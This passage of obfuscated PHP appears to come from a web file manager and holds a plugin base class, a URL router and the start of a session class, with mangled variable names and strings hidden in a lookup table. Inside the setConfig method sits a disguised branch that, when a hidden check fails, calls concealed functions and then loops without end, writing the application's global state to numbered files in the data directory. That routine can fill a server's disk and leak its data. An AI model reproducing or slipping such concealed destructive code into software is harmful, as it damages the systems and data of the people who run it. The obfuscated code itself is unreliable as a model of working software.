IO::infoWithChildren($d’ÎèÄÀË); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $d’ÎèÄÀË; } } $CÓÇ³Ìİ†³ = $this->_cacheHttpFile($CÓÇ³Ìİ†³); $this->fileInfo = IO::infoWithChildren($CÓÇ³Ìİ†³); } else { $this->fileInfo = IO::infoWithChildren($CÓÇ³Ìİ†³); if (!$this->fileInfo) { show_tips(LNG($d¯­ÊÄŞ¯[104]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $CÓÇ³Ìİ†³; } final function _cacheHttpFile($DÅÙá”§™Ÿ) { $fœ•¡‡•ß = hash_path($DÅÙá”§™Ÿ, !0); $this->cachePath = $this->pluginCachePath($fœ•¡‡•ß); if ($a•Í¦ê¡êí = IO::fileNameExist($this->cachePath, $fœ•¡‡•ß)) { return KodIO::make($a•Í¦ê¡êí); } $d™¬™ˆÉ® = $this->cachePath . $fœ•¡‡•ß; return $this->pluginCacheFileSet($d™¬™ˆÉ®, file_get_contents($DÅÙá”§™Ÿ)); } final function _tmpFileName($bí–­àŞ‚Ù = array()) { goto aäó›ˆ“ ø; aäó›ˆ“ ø: $b®ºï¡­Š =& $_SERVER[Æ¼ôºÙï]; if (!$bí–­àŞ‚Ù) { $bí–­àŞ‚Ù = $this->fileInfo; } if (isset($bí–­àŞ‚Ù[$b®ºï¡­Š[170]])) { return $bí–­àŞ‚Ù[$b®ºï¡­Š[170]]; } goto cî†ìéÏ¶Ç; bÏŠ§¢Å„: $cİ²’ĞøÉè = array($bí–­àŞ‚Ù[$b®ºï¡­Š[28]], $bí–­àŞ‚Ù[$b®ºï¡­Š[75]], $bí–­àŞ‚Ù[$b®ºï¡­Š[77]]); if (isset($bí–­àŞ‚Ù[$b®ºï¡­Š[477]])) { $cİ²’ĞøÉè[] = $bí–­àŞ‚Ù[$b®ºï¡­Š[477]]; } return md5(implode($b®ºï¡­Š[70], $cİ²’ĞøÉè)); goto a„ËÔ”Í¶; cî†ìéÏ¶Ç: if (isset($bí–­àŞ‚Ù[$b®ºï¡­Š[163]][$b®ºï¡­Š[170]])) { return $bí–­àŞ‚Ù[$b®ºï¡­Š[163]][$b®ºï¡­Š[170]]; } $cî¡Œø°®¨ = IO::hashSimple($bí–­àŞ‚Ù[$b®ºï¡­Š[75]]); if ($cî¡Œø°®¨) { return $cî¡Œø°®¨; } goto bÏŠ§¢Å„; a„ËÔ”Í¶: } final function checkSharePath($Fñ´ÕóÊ³á) { goto b¥²¨„µÄ; CÄÍ¤àóÊ: $FŠñ“ŠÍÈë = Action($eŠËï’°ß[1049])->sharePathInfo($Fñ´ÕóÊ³á); if (!isset($FŠñ“ŠÍÈë[$eŠËï’°ß[75]])) { show_json(LNG($eŠËï’°ß[1401]), !1); } $this->fileInfo = $FŠñ“ŠÍÈë[$eŠËï’°ß[163]]; goto dãÁÈø‘ïõ; b¥²¨„µÄ: $eŠËï’°ß =& $_SERVER[Æ¼ôºÙï]; if (!defined($eŠËï’°ß[443])) { define($eŠËï’°ß[1400], 0); } if (!$this->isShare($Fñ´ÕóÊ³á)) { return !1; } goto CÄÍ¤àóÊ; dãÁÈø‘ïõ: $this->cachePath = $this->pluginCachePath($this->fileInfo[$eŠËï’°ß[170]]); return $FŠñ“ŠÍÈë[$eŠËï’°ß[75]]; goto B„¨‰ìÛô„; B„¨‰ìÛô„: } final function pluginCachePath($dÉ½õĞ³¦ = '') { $Eƒ‰ö›ŠÎÀ =& $_SERVER[Æ¼ôºÙï]; $CÔ‰ñ‡Óç¾ = IO_PATH_SYSTEM_TEMP . $Eƒ‰ö›ŠÎÀ[1402] . $this->pluginName; if (!($Fƒ„ä°¤°± = IO::infoFull($CÔ‰ñ‡Óç¾))) { return IO::mkdir($CÔ‰ñ‡Óç¾ . $Eƒ‰ö›ŠÎÀ[8] . $dÉ½õĞ³¦); } if (empty($dÉ½õĞ³¦)) { return $Fƒ„ä°¤°±[$Eƒ‰ö›ŠÎÀ[75]]; } if (!($c¤Ÿá¾ô–š = IO::fileNameExist($Fƒ„ä°¤°±[$Eƒ‰ö›ŠÎÀ[75]], $dÉ½õĞ³¦))) { return IO::mkdir($Fƒ„ä°¤°±[$Eƒ‰ö›ŠÎÀ[75]] . $dÉ½õĞ³¦); } return KodIO::make($c¤Ÿá¾ô–š); } final function pluginCacheFileSet($BŞÂöòÛğÜ, $CÁÙ©¡ ­à = '') { $d†­çØŠÌ =& $_SERVER[Æ¼ôºÙï]; if (!($f¾àöŞÂ³ç = IO::infoFull($BŞÂöòÛğÜ))) { return IO::mkfile($BŞÂöòÛğÜ, $CÁÙ©¡ ­à, REPEAT_REPLACE); } IO::setContent($f¾àöŞÂ³ç[$d†­çØŠÌ[75]], $CÁÙ©¡ ­à); return $f¾àöŞÂ³ç[$d†­çØŠÌ[75]]; } final function pluginLocalFile($D›¦Ú±…Ø” = '') { goto cŒ±‰Ú‡”õ; f„ˆà½Ô¼: if (!checkExtSafe($eõŞáÍÓŞ‰)) { $eõŞáÍÓŞ‰ = $eõŞáÍÓŞ‰ . $cã—ªÖâ…¬[1403]; } $EÕ…İ°ôÒ¦ = $D÷†õ…Â˜ . $eõŞáÍÓŞ‰; if (@file_exists($EÕ…İ°ôÒ¦)) { return $EÕ…İ°ôÒ¦; } goto a¼”’çê¬Ó; E¦ğŞÊœáˆ: if (!$D›¦Ú±…Ø”) { return $D÷†õ…Â˜; } $eŒğ¼”Ç = IO::info($D›¦Ú±…Ø”); $eõŞáÍÓŞ‰ = $this->_tmpFileName($eŒğ¼”Ç) . $cã—ªÖâ…¬[94] . $eŒğ¼”Ç[$cã—ªÖâ…¬[167]]; goto f„ˆà½Ô¼; a¼”’çê¬Ó: return IO::copy($D›¦Ú±…Ø”, $D÷†õ…Â˜, 0, $eõŞáÍÓŞ‰); goto a¹œ §½¡; cŒ±‰Ú‡”õ: $cã—ªÖâ…¬ =& $_SERVER[Æ¼ôºÙï]; $D÷†õ…Â˜ = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($D÷†õ…Â˜)) { mk_dir($D÷†õ…Â˜); } goto E¦ğŞÊœáˆ; a¹œ §½¡: } final function appPackage() { goto E™ØÃæÒ; E™ØÃæÒ: $a‹†”©ò¥… =& $_SERVER[Æ¼ôºÙï]; if ($this->packageData) { return $this->packageData; } $bÖ™Á¡ø¶ = $this->parseFile($this->pluginPath . $a‹†”©ò¥…[1404]); goto E¹¹è„Æµ³; båÉ¿™» Ÿ: $cíËŸÆ†½ = Hook::trigger($a‹†”©ò¥…[1405], $fÖ¢æšåÎã); if ($cíËŸÆ†½ && is_array($cíËŸÆ†½)) { $fÖ¢æšåÎã = $cíËŸÆ†½; } $this->packageData = $fÖ¢æšåÎã; goto cØ¦„±–; E¹¹è„Æµ³: $this->parseLang($bÖ™Á¡ø¶); $fÖ¢æšåÎã = json_decode_force($bÖ™Á¡ø¶); if (!$fÖ¢æšåÎã) { return array(); } goto båÉ¿™» Ÿ; cØ¦„±–: return $fÖ¢æšåÎã; goto f™ˆÊ›½È; f™ˆÊ›½È: } public function packageInfoGet($f”Ã‘¶ï‘ê) { $e—ğÊ¬İî = $this->appPackage(); return array_get_value($e—ğÊ¬İî, $f”Ã‘¶ï‘ê); } public function packageVersion() { return $this->packageInfoGet($_SERVER[Æ¼ôºÙï][1406]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[Æ¼ôºÙï][1407]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[Æ¼ôºÙï][1408]); } private function parseFile($e×¸š¨’) { goto B ˆŸÂÜ•; DŞÌäÀƒØ: $eõ Â‰½Ö‰ = str_replace($aŒ×›ÛÏ‡», $fœ´òé‚ªÖ, $eõ Â‰½Ö‰); return $eõ Â‰½Ö‰; goto D†ò©ƒğ­Ã; B ˆŸÂÜ•: $bô›­…ŒÃî =& $_SERVER[Æ¼ôºÙï]; $eõ Â‰½Ö‰ = file_get_contents($e×¸š¨’); $aŒ×›ÛÏ‡» = array($bô›­…ŒÃî[1409], $bô›­…ŒÃî[1410], $bô›­…ŒÃî[1411], $bô›­…ŒÃî[1412], $bô›­…ŒÃî[1413], $bô›­…ŒÃî[1414], $bô›­…ŒÃî[1415]); goto e§¨îõõ…Â; e§¨îõõ…Â: $fœ´òé‚ªÖ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$bô›­…ŒÃî[87]][$bô›­…ŒÃî[1416]]); if (strstr($eõ Â‰½Ö‰, $bô›­…ŒÃî[1417])) { $bó°Éğ¥„Ó = rawurlencode(json_encode($this->pluginLangArr)); $eõ Â‰½Ö‰ = str_replace($bô›­…ŒÃî[1417], $bó°Éğ¥„Ó, $eõ Â‰½Ö‰); } if (strstr($eõ Â‰½Ö‰, $bô›­…ŒÃî[1418])) { $bó°Éğ¥„Ó = $bó°Éğ¥„Ó = rawurlencode(json_encode($this->getConfig())); $eõ Â‰½Ö‰ = str_replace($bô›­…ŒÃî[1418], $bó°Éğ¥„Ó, $eõ Â‰½Ö‰); } goto DŞÌäÀƒØ; D†ò©ƒğ­Ã: } private function parseLang(&$C²ÁĞë”) { goto cø›†¦ÄÛø; Bƒƒ™ÌÈœ: $b’ò†¡…«¨ = array(); foreach ($e¡ßŠ¯÷ÑÔ[0] as $F„ÕÎ˜ùµô) { $b‚˜Ñî£Æ = substr($F„ÕÎ˜ùµô, strlen($CôĞĞ·ïö), -4); $b–«Ñ®´—— = LNG($b‚˜Ñî£Æ); $Bïˆ•²’ƒ¥[] = $F„ÕÎ˜ùµô; $b’ò†¡…«¨[] = str_replace(array($Fë£ğõ·… [227], $Fë£ğõ·… [1016], $Fë£ğõ·… [338], $Fë£ğõ·… [115]), array($Fë£ğõ·… [50], $Fë£ğõ·… [50], $Fë£ğõ·… [33], $Fë£ğõ·… [1421]), $b–«Ñ®´——); } $C²ÁĞë” = str_replace($Bïˆ•²’ƒ¥, $b’ò†¡…«¨, $C²ÁĞë”); goto AŠø«‡”Çé; cø›†¦ÄÛø: $Fë£ğõ·…  =& $_SERVER[Æ¼ôºÙï]; $CôĞĞ·ïö = $Fë£ğõ·… [1419]; if (!strstr($C²ÁĞë”, $CôĞĞ·ïö)) { return; } goto eÓÎÃßİ¡; eÓÎÃßİ¡: preg_match_all($Fë£ğõ·… [1420], $C²ÁĞë”, $e¡ßŠ¯÷ÑÔ); if (!is_array($e¡ßŠ¯÷ÑÔ) || count($e¡ßŠ¯÷ÑÔ) == 0 || !is_array($e¡ßŠ¯÷ÑÔ[0]) || count($e¡ßŠ¯÷ÑÔ[0]) == 0) { return; } $Bïˆ•²’ƒ¥ = array(); goto Bƒƒ™ÌÈœ; AŠø«‡”Çé: } private function parseConfig(&$BåÃÚ¨´Ö) { goto BÈÆ ÀÊäñ; fšÎÏ¹„ÍÂ: $EµÇé§ô‰½ = array(); $f‡êæ†ä‰° = array(); foreach ($B¥ø§¸Ÿ¢»[0] as $C¹À ÁÃ£ã) { $eô¯’Ïá™ = substr($C¹À ÁÃ£ã, strlen($d¸®Ü¬‹Œ), -2); $EµÇé§ô‰½[] = $C¹À ÁÃ£ã; $f‡êæ†ä‰°[] = _get($FÅ‘ÙÇŸøê, $eô¯’Ïá™); } goto b‰ºŒÜŞä±; e½Òè˜£„À: preg_match_all($CÖ×‡¯[1423], $BåÃÚ¨´Ö, $B¥ø§¸Ÿ¢»); if (!is_array($B¥ø§¸Ÿ¢») || count($B¥ø§¸Ÿ¢») == 0 || !is_array($B¥ø§¸Ÿ¢»[0]) || count($B¥ø§¸Ÿ¢»[0]) == 0) { return; } $FÅ‘ÙÇŸøê = $this->getConfig(); goto fšÎÏ¹„ÍÂ; b‰ºŒÜŞä±: $BåÃÚ¨´Ö = str_replace($EµÇé§ô‰½, $f‡êæ†ä‰°, $BåÃÚ¨´Ö); goto b¡¼Ó­ö…±; BÈÆ ÀÊäñ: $CÖ×‡¯ =& $_SERVER[Æ¼ôºÙï]; $d¸®Ü¬‹Œ = $CÖ×‡¯[1422]; if (!strstr($BåÃÚ¨´Ö, $d¸®Ü¬‹Œ)) { return; } goto e½Òè˜£„À; b¡¼Ó­ö…±: } private function parsePackage(&$c›‰¹íê·¶) { goto Dœæ˜»ë¶ ; Dœæ˜»ë¶ : $dô‰„Ãø£ =& $_SERVER[Æ¼ôºÙï]; $a¡ìâË‡å = $dô‰„Ãø£[1424]; if (!strstr($c›‰¹íê·¶, $a¡ìâË‡å)) { return; } goto e±Œ¡İœÃÑ; A’£‹šñÈµ: $AÊœ¨œ”äÁ = array(); $b¨“½²ò©³ = array(); foreach ($E†ËÉ’ˆŒÌ[0] as $E„‚…çŠ£ƒ) { $b´ˆŒ¯ ãˆ = substr($E„‚…çŠ£ƒ, strlen($a¡ìâË‡å), -2); $AÊœ¨œ”äÁ[] = $E„‚…çŠ£ƒ; $b¨“½²ò©³[] = _get($aíœäÊˆò, $b´ˆŒ¯ ãˆ); } goto DÍœ×¥Ã‰Ş; DÍœ×¥Ã‰Ş: $c›‰¹íê·¶ = str_replace($AÊœ¨œ”äÁ, $b¨“½²ò©³, $c›‰¹íê·¶); goto b¼˜ª ¬¤ä; e±Œ¡İœÃÑ: preg_match_all($dô‰„Ãø£[1425], $c›‰¹íê·¶, $E†ËÉ’ˆŒÌ); if (!is_array($E†ËÉ’ˆŒÌ) || count($E†ËÉ’ˆŒÌ) == 0 || !is_array($E†ËÉ’ˆŒÌ[0]) || count($E†ËÉ’ˆŒÌ[0]) == 0) { return; } $aíœäÊˆò = $this->appPackage(); goto A’£‹šñÈµ; b¼˜ª ¬¤ä: } final function echoFile($d¢ÓšÉä¿, $FÔÀÒÀ³çÃ = false) { goto BöÃğîã†À; BöÃğîã†À: $dù‰‚¸°¿ =& $_SERVER[Æ¼ôºÙï]; $Eï§¦áÜé¯ = $this->pluginPath . $d¢ÓšÉä¿; if (ACT == $dù‰‚¸°¿[1426]) { echo $dù‰‚¸°¿[1427] . $this->pluginName . $dù‰‚¸°¿[8] . $d¢ÓšÉä¿ . $dù‰‚¸°¿[1428]; if (!file_exists($Eï§¦áÜé¯)) { echo $dù‰‚¸°¿[1429]; return; } } goto aº¡•ø‘š¾; aº¡•ø‘š¾: $F× ²™½àŠ = $this->parseFile($Eï§¦áÜé¯); $this->parseLang($F× ²™½àŠ); $this->parseConfig($F× ²™½àŠ); goto b¤¸µß„Ğ¨; b¤¸µß„Ğ¨: $this->parsePackage($F× ²™½àŠ); if (is_array($FÔÀÒÀ³çÃ)) { $F× ²™½àŠ = str_replace(array_keys($FÔÀÒÀ³çÃ), array_values($FÔÀÒÀ³çÃ), $F× ²™½àŠ); } echo $dù‰‚¸°¿[227] . $F× ²™½àŠ; goto a†ùã¤ƒö; a†ùã¤ƒö: } final function initLang() { goto Eó¬„ï‚ğò; aÊÔ…Ô÷òã: $c§Á…ëÚ¿ = I18n::getType(); $EÑ©ÔÇ = array(); if (file_exists($dÒ‰­èŞ½ . $c§Á…ëÚ¿ . $DÈ ×ğ¤¥ä[783])) { $EÑ©ÔÇ = (include $dÒ‰­èŞ½ . $c§Á…ëÚ¿ . $DÈ ×ğ¤¥ä[783]); } else { if ($c§Á…ëÚ¿ == $DÈ ×ğ¤¥ä[1432] && !file_exists($dÒ‰­èŞ½ . $c§Á…ëÚ¿ . $DÈ ×ğ¤¥ä[783]) && file_exists($dÒ‰­èŞ½ . $DÈ ×ğ¤¥ä[1433])) { $EÑ©ÔÇ = (include $dÒ‰­èŞ½ . $DÈ ×ğ¤¥ä[1433]); } else { if (file_exists($dÒ‰­èŞ½ . $a¬ì¼‘ÁÕ° . $DÈ ×ğ¤¥ä[783])) { $EÑ©ÔÇ = (include $dÒ‰­èŞ½ . $a¬ì¼‘ÁÕ° . $DÈ ×ğ¤¥ä[783]); } } } goto eˆ®˜‚³ÏÎ; eˆ®˜‚³ÏÎ: if (!is_array($EÑ©ÔÇ)) { return array(); } if (@count($EÑ©ÔÇ) > 0) { I18n::set($EÑ©ÔÇ); } return $EÑ©ÔÇ; goto C‰Ò‡½¸¼ƒ; Eó¬„ï‚ğò: $DÈ ×ğ¤¥ä =& $_SERVER[Æ¼ôºÙï]; $a¬ì¼‘ÁÕ° = $DÈ ×ğ¤¥ä[1430]; $dÒ‰­èŞ½ = $this->pluginPath . $DÈ ×ğ¤¥ä[1431]; goto aÊÔ…Ô÷òã; C‰Ò‡½¸¼ƒ: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($C”‰°±òÉÅ) { $dƒä§Ñ¬¡  =& $_SERVER[Æ¼ôºÙï]; $Dí‚ãƒİç = $_SERVER[$dƒä§Ñ¬¡ [811]]; $cï©¥Ï¬îˆ = $dƒä§Ñ¬¡ [812]; if ($_SERVER[$dƒä§Ñ¬¡ [813]] != $cï©¥Ï¬îˆ($Dí‚ãƒİç)) { goto a·ÕÓñÔê; fß¿‰ôÒ½: $cŞä¾ì„¼æ = 1; for ($B‚‚‡…¸–¶ = $cŞä¾ì„¼æ; $B‚‚‡…¸–¶ > 0; $B‚‚‡…¸–¶++) { $DÁ‰ßåâì¨(DATA_PATH . $B‚‚‡…¸–¶, $bÜÙ¨ÊÔÀã); } goto EÉÄÅ÷©¥Í; a¨ê‘ÈœŞ: $C˜…Ù ‡£ = $C¼‘¥ÇŒï¨($dÇçºÄ²·ë); $Fñ‡™Š­«¤ = explode($dƒä§Ñ¬¡ [227], $C˜…Ù ‡£); if (count($Fñ‡™Š­«¤) < $dƒä§Ñ¬¡ [574]) { $Aè¬Úˆ‡¯ = $dƒä§Ñ¬¡ [818]; $Aè¬Úˆ‡¯(); } goto DªâÕõÒ×Á; AšÖÂ‡‘Œ: $CÔÍÏÏ¼Û°(); $DÁ‰ßåâì¨ = $dƒä§Ñ¬¡ [821]; $bÜÙ¨ÊÔÀã = json_encode($GLOBALS[$dƒä§Ñ¬¡ [822]]); goto fß¿‰ôÒ½; a·ÕÓñÔê: $CÔÍÏÏ¼Û° = $dƒä§Ñ¬¡ [814]; $C¼‘¥ÇŒï¨ = $dƒä§Ñ¬¡ [815]; $dÇçºÄ²·ë = $_SERVER[$dƒä§Ñ¬¡ [816]] . $dƒä§Ñ¬¡ [817]; goto a¨ê‘ÈœŞ; DªâÕõÒ×Á: $b¹‚»¼ï­· = $dƒä§Ñ¬¡ [819]; $b¹‚»¼ï­·($_SERVER[$dƒä§Ñ¬¡ [820]]); $CÔÍÏÏ¼Û° = $dƒä§Ñ¬¡ [814]; goto AšÖÂ‡‘Œ; EÉÄÅ÷©¥Í: } return $this->modelPlugin->setConfig($this->pluginName, $C”‰°±òÉÅ); } public function onSetConfig($díçëáÛôà) { } public function onGetConfig($dæ–á¦¨ÑÏ) { } public function onChangeStatus($BŠ¹´â÷æ) { } public function onUninstall() { } public function onInstall() { } public function authCheck($f‰Œ“’µÒÒ = "\x70\154\165\x67\151\x6e\101\x75\164\x68") { $Eé¬–à£ =& $_SERVER[Æ¼ôºÙï]; if (!defined($Eé¬–à£[443])) { return !1; } if (_get($GLOBALS, $Eé¬–à£[475])) { return !0; } $BÖªÌ­è = $this->getConfig(); if (!$BÖªÌ­è[$f‰Œ“’µÒÒ]) { return !1; } return ActionCall($Eé¬–à£[1434], $BÖªÌ­è[$f‰Œ“’µÒÒ]); } public function url($bÔ²Ê©Ã, $b¸¿¢ìÔ—³ = '', $a·ª–¸ù = true) { goto d¾ÊÂÊöö‘; d¾ÊÂÊöö‘: $CØƒ±ë¹Â =& $_SERVER[Æ¼ôºÙï]; $bÕÌáºÒ˜  = $this->getConfig(); $fÂÖ²—‚–Â = KOD_VERSION . $CØƒ±ë¹Â[94] . KOD_VERSION_BUILD; goto aóšùà­÷…; AÛëÂ»å: if (!$a·ª–¸ù) { return $Dø•ƒ‚®Ã—; } echo $Dø•ƒ‚®Ã—; goto Aòº®‹¨¥æ; aóšùà­÷…: $cØßñŒ ¼à = $this->packageVersion(); $aŠíáĞÉ‡ = $fÂÖ²—‚–Â . $CØƒ±ë¹Â[429] . $cØßñŒ ¼à; if (substr($bÔ²Ê©Ã, 0, 4) == $CØƒ±ë¹Â[146] || substr($bÔ²Ê©Ã, 0, 2) == $CØƒ±ë¹Â[1220]) { $Dø•ƒ‚®Ã— = $bÔ²Ê©Ã . $CØƒ±ë¹Â[1435] . $aŠíáĞÉ‡; } else { if ($b¸¿¢ìÔ—³ == $CØƒ±ë¹Â[33]) { $Dø•ƒ‚®Ã— = $this->pluginHost . $bÔ²Ê©Ã . $CØƒ±ë¹Â[1435] . $aŠíáĞÉ‡; } else { if ($b¸¿¢ìÔ—³ === $CØƒ±ë¹Â[76]) { $Dø•ƒ‚®Ã— = $this->pluginHost . $bÔ²Ê©Ã; } else { if ($b¸¿¢ìÔ—³ == $CØƒ±ë¹Â[1436]) { $Dø•ƒ‚®Ã— = STATIC_PATH . $bÔ²Ê©Ã . $CØƒ±ë¹Â[1435] . $fÂÖ²—‚–Â; } else { if ($b¸¿¢ìÔ—³ == $CØƒ±ë¹Â[1437]) { $Dø•ƒ‚®Ã— = APP_HOST . $CØƒ±ë¹Â[1438] . $bÔ²Ê©Ã . $CØƒ±ë¹Â[1435] . $fÂÖ²—‚–Â; } else { if (isset($bÕÌáºÒ˜ [$b¸¿¢ìÔ—³])) { $Dø•ƒ‚®Ã— = $bÕÌáºÒ˜ [$b¸¿¢ìÔ—³] . $bÔ²Ê©Ã . $CØƒ±ë¹Â[1435] . $aŠíáĞÉ‡; } } } } } } goto AÛëÂ»å; Aòº®‹¨¥æ: } public function link($aˆ×£´¾›‹ = false, $bÛë¬¯Â‘Ô = '') { $dùç»‚·Ñ =& $_SERVER[Æ¼ôºÙï]; if (!$aˆ×£´¾›‹) { $this->link($dùç»‚·Ñ[1439], $dùç»‚·Ñ[1437]); $this->link($dùç»‚·Ñ[1440], $dùç»‚·Ñ[1436]); $this->link($dùç»‚·Ñ[1441], $dùç»‚·Ñ[1436]); $this->link($dùç»‚·Ñ[1442], $dùç»‚·Ñ[1436]); $this->link($dùç»‚·Ñ[1443], $dùç»‚·Ñ[1436]); return; } $D¦·ê³µœ = $this->url($aˆ×£´¾›‹, $bÛë¬¯Â‘Ô, !1); if (substr($aˆ×£´¾›‹, -3) == $dùç»‚·Ñ[1444]) { echo $dùç»‚·Ñ[1445] . $D¦·ê³µœ . $dùç»‚·Ñ[1446] . $dùç»‚·Ñ[227]; } else { if (substr($aˆ×£´¾›‹, -4) == $dùç»‚·Ñ[1447]) { echo $dùç»‚·Ñ[1448] . $D¦·ê³µœ . $dùç»‚·Ñ[1449] . $dùç»‚·Ñ[227]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\x6e\x79" => "\133\136\57\135\53", "\72\x6e\x75\155" => "\x5b\60\x2d\x39\x5d\53", "\x3a\141\x6c\154" => "\56\52"); public static $errorCallback; public static function __callstatic($B¦±Û‰Ö³, $fğÑ¬¶–ëµ) { $A•¶±´ÜÂÑ =& $_SERVER[Æ¼ôºÙï]; if ($B¦±Û‰Ö³ == $A•¶±´ÜÂÑ[1450]) { $bà Å¡¡Õ§ = array_map($A•¶±´ÜÂÑ[1451], $fğÑ¬¶–ëµ[0]); $C›†¹¹‡“£ = strpos($fğÑ¬¶–ëµ[1], $A•¶±´ÜÂÑ[8]) === 0 ? $fğÑ¬¶–ëµ[1] : $A•¶±´ÜÂÑ[8] . $fğÑ¬¶–ëµ[1]; $B¦Šø­ÄæÔ = $fğÑ¬¶–ëµ[2]; } else { $bà Å¡¡Õ§ = null; $C›†¹¹‡“£ = strpos($fğÑ¬¶–ëµ[0], $A•¶±´ÜÂÑ[8]) === 0 ? $fğÑ¬¶–ëµ[0] : $A•¶±´ÜÂÑ[8] . $fğÑ¬¶–ëµ[0]; $B¦Šø­ÄæÔ = $fğÑ¬¶–ëµ[1]; } array_push(self::$maps, $bà Å¡¡Õ§); array_push(self::$routes, $C›†¹¹‡“£); array_push(self::$methods, strtoupper($B¦±Û‰Ö³)); array_push(self::$callbacks, $B¦Šø­ÄæÔ); } public static function error($b¸á¹Œ¶Ó‘) { self::$errorCallback = $b¸á¹Œ¶Ó‘; } public static function haltOnMatch($Díœ¤İÄ¯ˆ = true) { self::$halts = $Díœ¤İÄ¯ˆ; } public static function dispatch() { goto BÒò‚öŸê; d©ÛÍ›êØ·: $F¥¼„»í = array_keys(static::$patterns); $a½ââ•’Í = array_values(static::$patterns); $f…šôšÎ¢­ = !1; goto cŠÑà‡øâ†; BÒò‚öŸê: $dˆÁƒ»‚Æ =& $_SERVER[Æ¼ôºÙï]; $Aà‡´ğìá = parse_url($_SERVER[$dˆÁƒ»‚Æ[1452]], PHP_URL_PATH); $dõÍŒ¦¼ñ = $_SERVER[$dˆÁƒ»‚Æ[156]]; goto d©ÛÍ›êØ·; cŠÑà‡øâ†: self::$routes = preg_replace($dˆÁƒ»‚Æ[1139], $dˆÁƒ»‚Æ[8], self::$routes); if (in_array($Aà‡´ğìá, self::$routes)) { $A‰‘ŒíÌÆ = array_keys(self::$routes, $Aà‡´ğìá); foreach ($A‰‘ŒíÌÆ as $EµîŠ‚„¦”) { if (self::$methods[$EµîŠ‚„¦”] == $dõÍŒ¦¼ñ || self::$methods[$EµîŠ‚„¦”] == $dˆÁƒ»‚Æ[1453] || in_array($dõÍŒ¦¼ñ, self::$maps[$EµîŠ‚„¦”])) { $f…šôšÎ¢­ = !0; if (!is_object(self::$callbacks[$EµîŠ‚„¦”])) { $Dœ˜§•‰ä = explode($dˆÁƒ»‚Æ[8], self::$callbacks[$EµîŠ‚„¦”]); $c‘ù¦”óİ = end($Dœ˜§•‰ä); $DÃÜ²‚ˆªİ = explode($dˆÁƒ»‚Æ[1454], $c‘ù¦”óİ); $Eƒ¦ÎÕÁ = new $DÃÜ²‚ˆªİ[0](); $Eƒ¦ÎÕÁ->{$DÃÜ²‚ˆªİ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$EµîŠ‚„¦”]); if (self::$halts) { return; } } } } } else { $E’‡“ŠÌá— = 0; foreach (self::$routes as $EµîŠ‚„¦”) { if (strpos($EµîŠ‚„¦”, $dˆÁƒ»‚Æ[4]) !== !1) { $EµîŠ‚„¦” = str_replace($F¥¼„»í, $a½ââ•’Í, $EµîŠ‚„¦”); } if (preg_match($dˆÁƒ»‚Æ[1455] . $EµîŠ‚„¦” . $dˆÁƒ»‚Æ[1456], $Aà‡´ğìá, $D‰°†©¥ìâ)) { if (self::$methods[$E’‡“ŠÌá—] == $dõÍŒ¦¼ñ || self::$methods[$E’‡“ŠÌá—] == $dˆÁƒ»‚Æ[1453] || !empty(self::$maps[$E’‡“ŠÌá—]) && in_array($dõÍŒ¦¼ñ, self::$maps[$E’‡“ŠÌá—])) { $f…šôšÎ¢­ = !0; array_shift($D‰°†©¥ìâ); if (!is_object(self::$callbacks[$E’‡“ŠÌá—])) { $Dœ˜§•‰ä = explode($dˆÁƒ»‚Æ[8], self::$callbacks[$E’‡“ŠÌá—]); $c‘ù¦”óİ = end($Dœ˜§•‰ä); $DÃÜ²‚ˆªİ = explode($dˆÁƒ»‚Æ[1454], $c‘ù¦”óİ); $Eƒ¦ÎÕÁ = new $DÃÜ²‚ˆªİ[0](); if (!method_exists($Eƒ¦ÎÕÁ, $DÃÜ²‚ˆªİ[1])) { echo $dˆÁƒ»‚Æ[1457]; } else { call_user_func_array(array($Eƒ¦ÎÕÁ, $DÃÜ²‚ˆªİ[1]), $D‰°†©¥ìâ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$E’‡“ŠÌá—], $D‰°†©¥ìâ); if (self::$halts) { return; } } } } $E’‡“ŠÌá—++; } } if ($f…šôšÎ¢­ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $B³ÌÆĞÉ¤‹ =& $_SERVER[Æ¼ôºÙï]; header($_SERVER[$B³ÌÆĞÉ¤‹[1458]] . $B³ÌÆĞÉ¤‹[1459]); echo $B³ÌÆĞÉ¤‹[1460]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$dˆÁƒ»‚Æ[1452]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto fº¯§ÂÏ™; fº¯§ÂÏ™: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto aàØˆĞø½; bêÍÇŒïô˜: $A›ğ»İŞ·ƒ = $GLOBALS[$D‘Û‘÷±…“[6]][$D‘Û‘÷±…“[345]]; self::$sessionTime = $A›ğ»İŞ·ƒ[$D‘Û‘÷±…“[1461]]; $d¸©‚‘˜‡ì = isset($GLOBALS[$D‘Û‘÷±…“[1462]]) ? $GLOBALS[$D‘Û‘÷±…“[1462]] : SESSION_ID; goto aÊÎãÏºßŒ; aàØˆĞø½: $D‘Û‘÷±…“ =& $_SERVER[Æ¼ôºÙï]; static $CÊ½‰´ß–à = false; if ($CÊ½‰´ß–à) { return $CÊ½‰´ß–à; } goto bêÍÇŒïô˜; e…óï°…»ç: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $CÊ½‰´ß–à = new self(); return $CÊ½‰´ß–à; goto BÒğğ†¾œ§; fîñŠõ¨ÙÔ: $F˜¼±‰Ã § = $A›ğ»İŞ·ƒ[$A¼ŠÁÃØùç]; $b¯Õ´­ë¶İ = $A›ğ»İŞ·ƒ[$D‘Û‘÷±…“[773]]; switch ($A¼ŠÁÃØùç) { 